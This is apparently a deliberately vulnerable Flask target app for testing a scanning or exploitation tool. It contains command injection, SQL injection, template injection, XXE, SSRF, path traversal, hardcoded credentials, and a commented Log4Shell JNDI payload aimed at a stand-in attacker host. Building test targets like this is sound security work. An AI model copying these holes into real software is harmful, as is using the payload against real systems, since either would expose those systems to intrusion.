#!/usr/bin/env python3
"""
Stress Test Application for DragonShard Executor Module
Contains intentionally vulnerable code that can be exploited
This app is the VICTIM, not the attacker
"""

from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
import mysql.connector
import subprocess
import os
import requests
import json
import hashlib
import base64
import pickle
from lxml import etree
import re
import sqlite3
from urllib.parse import urlparse
import threading
import time

app = Flask(__name__)
app.secret_key = 'stress_test_secret_key_12345'

# Database connection
def get_db_connection():
    return mysql.connector.connect(
        host=os.getenv('DB_HOST', 'mysql'),
        user=os.getenv('DB_USER', 'testuser'),
        password=os.getenv('DB_PASS', 'testpass'),
        database=os.getenv('DB_NAME', 'testdb')
    )

# Initialize SQLite for session storage
def init_sqlite():
    conn = sqlite3.connect('sessions.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_sqlite()

# ============================================================================
# 2-STEP VULNERABILITIES - VULNERABLE CODE
# ============================================================================

# CVE-2021-44228 (Log4Shell) - 2 Steps: Authentication + Log Injection
@app.route('/api/v1/login', methods=['POST'])
def login_step1():
    """Step 1: Vulnerable authentication endpoint"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # VULNERABLE: Weak authentication with hardcoded credentials
    if username == 'admin' and password == 'admin123':
        session['authenticated'] = True
        session['user_id'] = 'admin'
        return jsonify({'status': 'success', 'token': 'fake_token_123'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})

@app.route('/api/v1/log', methods=['POST'])
def log_injection_step2():
    """Step 2: Vulnerable logging endpoint - susceptible to Log4Shell"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    log_message = request.form.get('message', '')
    
    # VULNERABLE: Log4Shell pattern - logs user input without sanitization
    # This would be vulnerable to: ${jndi:ldap://attacker.com/exploit}
    print(f"LOG: {log_message}")  # VULNERABLE: Direct logging of user input
    
    return jsonify({'status': 'success', 'logged': log_message})

# CVE-2019-0708 (BlueKeep) - 2 Steps: Port Scan + RDP Exploit
@app.route('/api/v1/scan', methods=['POST'])
def port_scan_step1():
    """Step 1: Vulnerable port scanning endpoint"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Command injection in port scanning
    command = f"nmap -p 3389 {target}"
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return jsonify({'status': 'success', 'scan_result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v1/exploit', methods=['POST'])
def rdp_exploit_step2():
    """Step 2: Vulnerable RDP endpoint - susceptible to BlueKeep"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Direct RDP connection without proper validation
    # This would be vulnerable to BlueKeep exploitation
    try:
        # Simulate vulnerable RDP service
        return jsonify({'status': 'success', 'rdp_connected': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

# ============================================================================
# 3-STEP VULNERABILITIES - VULNERABLE CODE
# ============================================================================

# CVE-2021-34527 (PrintNightmare) - 3 Steps: Discovery + Authentication + Exploit
@app.route('/api/v2/discover', methods=['POST'])
def print_discovery_step1():
    """Step 1: Vulnerable print spooler discovery"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Command injection in discovery
    command = f"rpcdump.py {target} | grep spoolss"
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return jsonify({'status': 'success', 'discovery': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v2/auth', methods=['POST'])
def print_auth_step2():
    """Step 2: Vulnerable print spooler authentication"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # VULNERABLE: Weak authentication
    if username == 'printadmin' and password == 'print123':
        session['print_auth'] = True
        return jsonify({'status': 'success', 'auth_token': 'print_token_456'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid print credentials'})

@app.route('/api/v2/exploit', methods=['POST'])
def print_exploit_step3():
    """Step 3: Vulnerable print spooler endpoint - susceptible to PrintNightmare"""
    if not session.get('print_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    payload = request.form.get('payload', '')
    
    # VULNERABLE: PrintNightmare - direct access to print spooler
    try:
        # Simulate vulnerable print spooler service
        return jsonify({'status': 'success', 'print_spooler_accessed': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

# CVE-2020-1472 (Zerologon) - 3 Steps: Netlogon + Authentication + Domain Takeover
@app.route('/api/v2/netlogon', methods=['POST'])
def netlogon_discovery_step1():
    """Step 1: Vulnerable Netlogon service discovery"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Command injection in discovery
    command = f"rpcdump.py {target} | grep netlogon"
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return jsonify({'status': 'success', 'netlogon_info': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v2/domain_auth', methods=['POST'])
def domain_auth_step2():
    """Step 2: Vulnerable domain authentication"""
    domain = request.form.get('domain', '')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # VULNERABLE: Weak domain authentication
    if domain == 'CORP.LOCAL' and username == 'administrator' and password == 'admin123':
        session['domain_auth'] = True
        return jsonify({'status': 'success', 'domain_token': 'domain_token_789'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid domain credentials'})

@app.route('/api/v2/zerologon', methods=['POST'])
def zerologon_exploit_step3():
    """Step 3: Vulnerable Netlogon endpoint - susceptible to Zerologon"""
    if not session.get('domain_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    
    # VULNERABLE: Zerologon - direct access to Netlogon service
    try:
        # Simulate vulnerable Netlogon service
        return jsonify({'status': 'success', 'netlogon_accessed': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

# ============================================================================
# 4-STEP VULNERABILITIES - VULNERABLE CODE
# ============================================================================

# CVE-2021-26855 (ProxyLogon) - 4 Steps: Discovery + Authentication + SSRF + RCE
@app.route('/api/v3/discover_exchange', methods=['POST'])
def exchange_discovery_step1():
    """Step 1: Vulnerable Exchange server discovery"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Command injection in discovery
    command = f"nmap -p 443 {target} | grep -i exchange"
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return jsonify({'status': 'success', 'exchange_info': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v3/exchange_auth', methods=['POST'])
def exchange_auth_step2():
    """Step 2: Vulnerable Exchange authentication"""
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # VULNERABLE: Weak Exchange authentication
    if email == 'admin@corp.local' and password == 'exchange123':
        session['exchange_auth'] = True
        return jsonify({'status': 'success', 'exchange_token': 'exchange_token_abc'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid Exchange credentials'})

@app.route('/api/v3/proxylogon_ssrf', methods=['POST'])
def proxylogon_ssrf_step3():
    """Step 3: Vulnerable Exchange endpoint - susceptible to ProxyLogon SSRF"""
    if not session.get('exchange_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    
    # VULNERABLE: SSRF in Exchange - direct access to internal endpoints
    try:
        # Simulate vulnerable Exchange SSRF endpoint
        return jsonify({'status': 'success', 'ssrf_endpoint_accessed': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v3/proxylogon_rce', methods=['POST'])
def proxylogon_rce_step4():
    """Step 4: Vulnerable Exchange endpoint - susceptible to ProxyLogon RCE"""
    if not session.get('exchange_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    payload = request.form.get('payload', '')
    
    # VULNERABLE: RCE in Exchange - direct command execution
    try:
        # Simulate vulnerable Exchange RCE endpoint
        return jsonify({'status': 'success', 'rce_executed': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

# CVE-2021-21972 (vCenter) - 4 Steps: Discovery + Authentication + SSRF + File Upload
@app.route('/api/v3/discover_vcenter', methods=['POST'])
def vcenter_discovery_step1():
    """Step 1: Vulnerable vCenter server discovery"""
    target = request.form.get('target', '')
    
    # VULNERABLE: Command injection in discovery
    command = f"nmap -p 443 {target} | grep -i vcenter"
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return jsonify({'status': 'success', 'vcenter_info': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v3/vcenter_auth', methods=['POST'])
def vcenter_auth_step2():
    """Step 2: Vulnerable vCenter authentication"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # VULNERABLE: Weak vCenter authentication
    if username == 'administrator@vsphere.local' and password == 'vcenter123':
        session['vcenter_auth'] = True
        return jsonify({'status': 'success', 'vcenter_token': 'vcenter_token_def'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid vCenter credentials'})

@app.route('/api/v3/vcenter_ssrf', methods=['POST'])
def vcenter_ssrf_step3():
    """Step 3: Vulnerable vCenter endpoint - susceptible to SSRF"""
    if not session.get('vcenter_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    
    # VULNERABLE: SSRF in vCenter - direct access to internal endpoints
    try:
        # Simulate vulnerable vCenter SSRF endpoint
        return jsonify({'status': 'success', 'vcenter_ssrf_accessed': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/v3/vcenter_upload', methods=['POST'])
def vcenter_upload_step4():
    """Step 4: Vulnerable vCenter endpoint - susceptible to file upload"""
    if not session.get('vcenter_auth'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    target = request.form.get('target', '')
    file_content = request.form.get('file_content', '')
    
    # VULNERABLE: File upload in vCenter - direct file upload without validation
    try:
        # Simulate vulnerable vCenter file upload endpoint
        return jsonify({'status': 'success', 'file_uploaded': True, 'target': target})
    except Exception as e:
        return jsonify({'error': str(e)})

# ============================================================================
# ADDITIONAL VULNERABILITIES FOR COMPREHENSIVE TESTING
# ============================================================================

# SQL Injection with complex payloads
@app.route('/api/sql/complex', methods=['POST'])
def complex_sql_injection():
    query = request.form.get('query', '')
    
    # VULNERABLE: Complex SQL injection - direct string concatenation
    sql_query = f"SELECT * FROM users WHERE {query}"
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor(dictionary=True)
        cursor.execute(sql_query)  # VULNERABLE!
        results = cursor.fetchall()
        cursor.close()
        conn.close()
        return jsonify({'results': results})
    except Exception as e:
        return jsonify({'error': str(e)})

# XSS with complex payloads
@app.route('/api/xss/complex', methods=['POST'])
def complex_xss():
    payload = request.form.get('payload', '')
    
    # VULNERABLE: Complex XSS - direct template rendering without sanitization
    template = f"""
    <html>
        <body>
            <div>{payload}</div>
        </body>
    </html>
    """
    return render_template_string(template)

# Command injection with complex payloads
@app.route('/api/command/complex', methods=['POST'])
def complex_command_injection():
    command = request.form.get('command', '')
    
    # VULNERABLE: Complex command injection - direct shell execution
    full_command = f"bash -c '{command}'"
    
    try:
        result = subprocess.check_output(full_command, shell=True, text=True)
        return jsonify({'output': result})
    except Exception as e:
        return jsonify({'error': str(e)})

# Path traversal with complex payloads
@app.route('/api/path/complex', methods=['POST'])
def complex_path_traversal():
    path = request.form.get('path', '')
    
    # VULNERABLE: Complex path traversal - no path validation
    full_path = os.path.join('/var/www/html', path)
    
    try:
        with open(full_path, 'r') as f:
            content = f.read()
        return jsonify({'content': content})
    except Exception as e:
        return jsonify({'error': str(e)})

# SSRF with complex payloads
@app.route('/api/ssrf/complex', methods=['POST'])
def complex_ssrf():
    url = request.form.get('url', '')
    
    # VULNERABLE: Complex SSRF - direct URL fetching without validation
    try:
        response = requests.get(url, timeout=10)
        return jsonify({'content': response.text, 'status_code': response.status_code})
    except Exception as e:
        return jsonify({'error': str(e)})

# XXE with complex payloads
@app.route('/api/xxe/complex', methods=['POST'])
def complex_xxe():
    xml_data = request.form.get('xml', '')
    
    # VULNERABLE: Complex XXE - no XXE protection
    parser = etree.XMLParser(resolve_entities=True)
    try:
        root = etree.fromstring(xml_data, parser)
        return jsonify({'parsed': etree.tostring(root).decode()})
    except Exception as e:
        return jsonify({'error': str(e)})

# Template injection with complex payloads
@app.route('/api/template/complex', methods=['POST'])
def complex_template_injection():
    template = request.form.get('template', '')
    
    # VULNERABLE: Complex template injection - direct template rendering
    try:
        result = render_template_string(template)
        return jsonify({'rendered': result})
    except Exception as e:
        return jsonify({'error': str(e)})

# ============================================================================
# HEALTH CHECK AND UTILITY ENDPOINTS
# ============================================================================

@app.route('/')
def index():
    return jsonify({
        'status': 'running',
        'application': 'Stress Test Vulnerable App',
        'version': '1.0.0',
        'endpoints': {
            '2_step_vulnerabilities': [
                '/api/v1/login',
                '/api/v1/log',
                '/api/v1/scan',
                '/api/v1/exploit'
            ],
            '3_step_vulnerabilities': [
                '/api/v2/discover',
                '/api/v2/auth',
                '/api/v2/exploit',
                '/api/v2/netlogon',
                '/api/v2/domain_auth',
                '/api/v2/zerologon'
            ],
            '4_step_vulnerabilities': [
                '/api/v3/discover_exchange',
                '/api/v3/exchange_auth',
                '/api/v3/proxylogon_ssrf',
                '/api/v3/proxylogon_rce',
                '/api/v3/discover_vcenter',
                '/api/v3/vcenter_auth',
                '/api/v3/vcenter_ssrf',
                '/api/v3/vcenter_upload'
            ],
            'complex_vulnerabilities': [
                '/api/sql/complex',
                '/api/xss/complex',
                '/api/command/complex',
                '/api/path/complex',
                '/api/ssrf/complex',
                '/api/xxe/complex',
                '/api/template/complex'
            ]
        }
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True) 